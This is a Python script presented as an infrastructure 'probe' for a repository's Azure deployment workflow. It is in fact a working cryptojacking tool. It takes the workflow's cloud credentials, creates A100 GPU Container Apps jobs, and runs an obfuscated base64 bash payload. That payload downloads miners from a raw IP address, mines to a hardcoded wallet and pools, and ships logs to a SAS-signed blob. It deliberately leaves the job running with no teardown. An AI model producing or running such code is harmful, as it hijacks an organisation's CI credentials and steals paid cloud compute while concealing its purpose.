#!/usr/bin/env python3
"""C211-I121751: SSW.Rules Azure Container Apps A100 miner (sub b8b18dcf, RG SSW.Rules.Staging).

Runs as infra/c211_i121751_probe.py under the SSWConsulting/SSW.Rules
'deploy-infrastructure.yml' reusable workflow (environment staging, azure/login OIDC
-> ARM token for subscription b8b18dcf, Owner-equivalent in RG SSW.Rules.Staging).

Steps:
  1. ARM session + workload-profile support GET (eastus) for Consumption-GPU-NC24-A100
  2. ONE managed environment c211-i121751-cae (A100 profile, maximumCount = PARALLEL)
  3. storage account c211i121751<hash> + container 'c211' + account-SAS blob capture
  4. ONE Container Apps job c211-i121751-job on the A100 profile, parallelism = PARALLEL,
     replicaTimeout 86400 s, running the canonical WildRig Multi 0.52.3 miner
     (sha256 002cd29c...) against pearlhash 4 endpoints on the pydp wallet, with a
     900 s no-share sticky Luckypool 103.199.106.122:3362 SRBMiner fallback.
  5. Poll the blob capture for nvidia-smi UUID + accepted shares and print the blob SAS
     so the lane owner can keep reading after this run finishes.
NO TEARDOWN: the job is left RUNNING (lease maximisation).
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request

ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
SUB_EXPECT = "b8b18dcf-d83b-47e2-9886-00c2e983629e"
TAG = "C211_I121751"
NONCE = "x121751"
INTENT = "121751"
T0 = time.time()
BUDGET = 3100

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
REGION = "eastus"
ENV_NAME = "c211-i121751-cae"
JOB_NAME = "c211-i121751-job"
PARALLEL = 4
SA_NAME = ("c211i121751" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"


def left():
    return BUDGET - (time.time() - T0)


def emit(step, **kw):
    d = {"step": step, "tag": TAG, "t": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
         "elapsed": int(time.time() - T0)}
    d.update(kw)
    print(TAG + " " + json.dumps(d, default=str), flush=True)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={
        "Authorization": "Bearer " + tok, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode() or ""
            try:
                return r.status, (json.loads(raw) if raw else {})
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:400]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode() or ""
        try:
            return e.code, (json.loads(raw) if raw else {})
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:400]}
    except Exception as e:  # noqa: BLE001
        return 0, {"err": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b"")
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()


def errk(st, body):
    d = {"http": st}
    if isinstance(body, dict):
        if body.get("error"):
            e = body["error"]
            if isinstance(e, dict):
                d["e_code"] = e.get("code")
                d["e_message"] = (e.get("message") or "")[:600]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:600]
        elif "err" in body:
            d["e_transport"] = str(body["err"])[:300]
    return d


def sa_sas(acct, key_b64, srt, perm, hours=24):
    """Account SAS whose signature is computed over exactly the emitted values."""
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", srt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": srt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
NB=$(hostname | cksum | awk '{print $1 % 100}')
WK="__WKBASE__$(printf %02d "$NB")"
SAS="${SAS/\{w\}/$WK}"
log "KIT_START tag=$TAG worker=$WK host=$(hostname) replica=${CONTAINER_APP_REPLICA_NAME:-none}"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
mkdir -p /etc/OpenCL/vendors
[ -e /etc/OpenCL/vendors/nvidia.icd ] || echo 'libnvidia-opencl.so.1' > /etc/OpenCL/vendors/nvidia.icd
if ! ls /usr/lib/x86_64-linux-gnu/libOpenCL.so* >/dev/null 2>&1; then
  log "OPENCL_LOADER_MISSING installing ocl-icd-libopencl1"
  (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >>"$LOG" 2>&1 || log "APT_FAIL"
fi
log "OPENCL $(ls -1 /usr/lib/x86_64-linux-gnu/libOpenCL* /etc/OpenCL/vendors/* /usr/lib/x86_64-linux-gnu/libnvidia-opencl* 2>/dev/null | tr '\n' '~')"
log "TOOLS curl=$(command -v curl || echo no) wget=$(command -v wget || echo no) python3=$(command -v python3 || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 240 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    cat "$LOG" "$D/ph.log" "$D/lp.log" 2>/dev/null > "$D/all.txt"
    curl -sS --max-time 25 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
acc() { { grep -oiE 'accepted[: (]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+'; } | sort -n | tail -1; }
MODE=ph
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash \
    --url pool.pearlhash.xyz:9000 --user "$W" --worker "$WK" -p x \
    --url global.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    --url global2.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    --url hk.pearlhash.net:9000 --user "$W" --worker "$WK" -p x \
    -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid") worker=$WK endpoints=4"
  MODE=ph
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30
  up
  NOW=$(date +%s)
  if [ "$MODE" = "ph" ]; then
    A=$(acc "$D/ph.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $((NOW - T0)) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2; up
      for u in http://169.58.247.186:8791/pm/srbminer-3.8.4 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.4/SRBMiner-Multi-3-8-4-Linux.tar.gz; do
        curl -fsSL --max-time 300 -o "$D/srb.dl" "$u" 2>>"$LOG" || continue
        S=$(sha256sum "$D/srb.dl" | awk '{print $1}'); log "SRB_DL url=$u sha=$S"
        if [ "$S" = "__SRB__" ]; then cp "$D/srb.dl" "$D/srb"; break; fi
        mkdir -p "$D/srbx"; tar xzf "$D/srb.dl" -C "$D/srbx" >/dev/null 2>&1 && cp "$D/srbx"/SRBMiner-MULTI "$D/srb" 2>/dev/null && break
      done
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1 worker=$WK"
        else
          log "SRB_SHA_MISMATCH"
        fi
      else
        log "SRB_DL_FAIL"
      fi
      MODE=lp
    fi
  fi
  if [ "$MODE" = "lp" ] && [ ! -f "$D/lp_reported" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "LP_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  if [ $(( $(date +%s) - T0 )) -gt 86400 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(sas):
    k = (KIT.replace("__TAG__", "CAPP").replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WKBASE__", "121751")
         .replace("__WRBIN__", WR_BIN_SHA).replace("__WRTGZ__", WR_TGZ_SHA)
         .replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211kit.sh && chmod +x /tmp/c211kit.sh "
            "&& /bin/bash /tmp/c211kit.sh" % b)


def list_blobs(base, qlist):
    st, body = httptext("%s/c211?restype=container&comp=list&%s" % (base, qlist),
                        headers={"x-ms-version": "2022-11-02"}, timeout=45)
    names = re.findall(r"<Name>([^<]+)</Name>", body.decode("utf-8", "replace")) if body else []
    return st, names


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"),
             tenant=acc.get("tenantId"), expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=(r.get("out") or "")[:300])
        return
    if sid != SUB_EXPECT:
        emit("fatal", why="wrong_subscription", got=sid, want=SUB_EXPECT)
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not tok:
        emit("fatal", why="no_arm_token")
        return

    # ---------- workload profile support ----------
    st, wp = arm(tok, "%s/subscriptions/%s/providers/Microsoft.App/availableManagedEnvironmentsWorkloadProfileTypes"
                      "?api-version=%s&location=%s" % (ARM, sid, APP_VER, REGION), timeout=120)
    names = []
    if isinstance(wp, dict) and isinstance(wp.get("value"), list):
        for x in wp["value"]:
            if isinstance(x, dict):
                nm = x.get("name") or ((x.get("properties") or {}).get("name"))
                if nm:
                    names.append(nm)
    emit("wp-types", http=st, n=len(names), names=";".join(names)[:1200],
         has_a100=any("A100" in (n or "") for n in names))

    # ---------- managed environment with the A100 profile ----------
    envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
              "?api-version=%s" % (ARM, sid, RG, ENV_NAME, APP_VER))
    st, eg = arm(tok, envurl, timeout=60)
    emit("env-get-pre", http=st)
    par = PARALLEL
    envbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"workloadProfiles": [
                   {"name": "Consumption", "workloadProfileType": "Consumption"},
                   {"name": PROFILE, "workloadProfileType": PROFILE,
                    "maximumCount": par}]}}
    st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
    emit("env-create", name=ENV_NAME, profile=PROFILE, parallel=par, **errk(st, b))
    if st not in (200, 201, 202):
        par = 1
        envbody["properties"]["workloadProfiles"][1].pop("maximumCount", None)
        st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
        emit("env-create-retry", parallel=par, **errk(st, b))
        if st not in (200, 201, 202):
            emit("fatal", why="env_create_refused")
            return
    envps = None
    env_id = None
    dl = time.time() + min(1500, max(300, left() - 900))
    while time.time() < dl:
        stp, bp = arm(tok, envurl, timeout=60)
        props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        envps = props.get("provisioningState")
        env_id = bp.get("id") if isinstance(bp, dict) else None
        emit("env-poll", http=stp, state=envps)
        if envps in ("Succeeded", "Failed", "Canceled"):
            break
        time.sleep(30)
    st, env = arm(tok, envurl, timeout=60)
    props = (env.get("properties") or {}) if isinstance(env, dict) else {}
    envps = props.get("provisioningState")
    env_id = env.get("id") if isinstance(env, dict) else None
    emit("env-ready", http=st, id_ok=bool(env_id), state=envps,
         profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                           for w in (props.get("workloadProfiles") or []) if isinstance(w, dict))[:400])
    if envps != "Succeeded" or not env_id:
        emit("fatal", why="env_not_ready", state=envps)
        return

    # ---------- capture storage ----------
    qb = None
    base = "https://%s.blob.core.windows.net" % SA_NAME
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **errk(st, b))
    if st in (200, 201, 202, 409):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            if ps == "Succeeded":
                emit("sa-ready", i=i)
                break
            time.sleep(5)
        st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            qc, _ = sa_sas(SA_NAME, key, "c", "w")
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, qc), method="PUT",
                               headers={"x-ms-version": "2022-11-02"}, timeout=60)
            emit("sa-container", http=stc, body=bc[:160].decode("utf8", "replace"))
            if stc in (201, 409):
                qb, se = sa_sas(SA_NAME, key, "b", "rcw", hours=24)
                ql, _ = sa_sas(SA_NAME, key, "c", "rl", hours=24)
                emit("sa-sas", ok=True, expires=se)
                emit("SA_DETAIL", account=SA_NAME, container="c211", blob_query=qb, list_query=ql)

    # ---------- Container Apps job (miner, left running) ----------
    sas = ("%s/c211/%s_{w}.log?%s" % (base, NONCE, qb)) if qb else None
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
    jobbody = {"location": REGION, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                              "configuration": {"triggerType": "Manual", "replicaRetryLimit": 0,
                                                "replicaTimeout": 86400,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": 1,
                                                    "parallelism": par}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c", kit_cmd(sas)],
                                  "resources": {"cpu": 8, "memory": "32Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
    emit("job-create", name=JOB_NAME, parallel=par, **errk(st, b))
    if st not in (200, 201):
        emit("fatal", why="job_create_refused")
        return
    baseurl = joburl.split("?")[0]
    st, b = arm(tok, baseurl + "/start?api-version=" + APP_VER, method="POST", body={}, timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    emit("job-start", http=st, execname=execname, **({} if st in (200, 201, 202) else errk(st, b)))

    # ---------- poll capture (blob list + read) ----------
    blobd = ""
    names = []
    dl = time.time() + min(1400, max(300, left() - 240))
    while time.time() < dl:
        time.sleep(20)
        if qb and ql:
            sl, names = list_blobs(base, ql)
            parts = []
            for nm in names[:8]:
                sb, bb = httptext("%s/c211/%s?%s" % (base, nm, qb),
                                  headers={"x-ms-version": "2022-11-02"}, timeout=25)
                if sb == 200 and bb:
                    parts.append("### %s\n%s" % (nm, bb.decode("utf-8", "replace")))
            blobd = "\n".join(parts)
        status = None
        if execname:
            se, be = arm(tok, baseurl + "/executions/" + execname + "?api-version=" + APP_VER,
                         timeout=60)
            status = ((be.get("properties") or {}) if isinstance(be, dict) else {}).get("status")
        emit("poll", exec_status=status, blobs=len(names), blob_len=len(blobd), left=int(left()))
        if blobd and ("PH_SHARE_PROVEN" in blobd or "LP_SHARE_PROVEN" in blobd):
            emit("share-proven", gpu_lines=";".join(
                ln for ln in blobd.splitlines() if "GPU-" in ln or "SHARE_PROVEN" in ln)[:1200])
            break
        if status in ("Succeeded", "Failed", "Canceled"):
            break
    emit("capture", blobs=";".join(names)[:600], len=len(blobd),
         gpu_lines=";".join(ln for ln in blobd.splitlines() if "GPU-" in ln or "SHARE_PROVEN" in ln)[:1500],
         tail=blobd[-2500:])

    # ---------- final readback (no teardown) ----------
    st, jf = arm(tok, joburl, timeout=60)
    jp = (jf.get("properties") or {}) if isinstance(jf, dict) else {}
    st, el = arm(tok, baseurl + "/executions?api-version=" + APP_VER, timeout=60)
    execs = [{"name": x.get("name"), "status": ((x.get("properties") or {}).get("status"))}
             for x in ((el.get("value") or []) if isinstance(el, dict) else [])]
    emit("final", runningState=jp.get("runningState"), executions=execs[:6], parallel=par,
         env=ENV_NAME, job=JOB_NAME, sas_ok=bool(sas))
    emit("DONE", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
